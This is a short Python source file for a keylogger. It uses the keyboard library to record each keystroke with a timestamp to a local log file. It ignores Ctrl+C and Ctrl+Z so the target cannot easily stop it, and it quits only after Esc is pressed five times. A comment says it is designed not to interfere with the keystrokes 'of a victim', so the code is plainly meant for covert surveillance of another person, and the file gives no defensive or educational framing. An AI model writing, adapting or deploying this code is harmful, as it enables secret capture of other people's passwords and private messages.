from keyboard import *
from time import *

def main():
	min_esc = 0
	max_esc = 5 # maximum count of typing an 'esc' key
	print(strftime('{0} %A, %B %d, %Y {0}\n'.format(50 * '='), localtime()), file=open('log.txt', 'a')) # Daytime format: %Weekday%, %Month% %Day%, %Year%
	while min_esc != max_esc:
		try:
			r = read_hotkey(False) # I use False value to avoid supressing any single strokes of a victim
			if r == 'esc':
				min_esc += 1
			print(strftime('%I : %M : %S', localtime()), r, file=open('log.txt', 'a'), sep=' -> ') # Time Format: %Hours% : %Minutes% : %Seconds%
		except KeyboardInterrupt: # Ctrl + C ignored
			continue
		except EOFError: # Ctrl + Z ignored
			continue

if __name__ == '__main__':
	main()
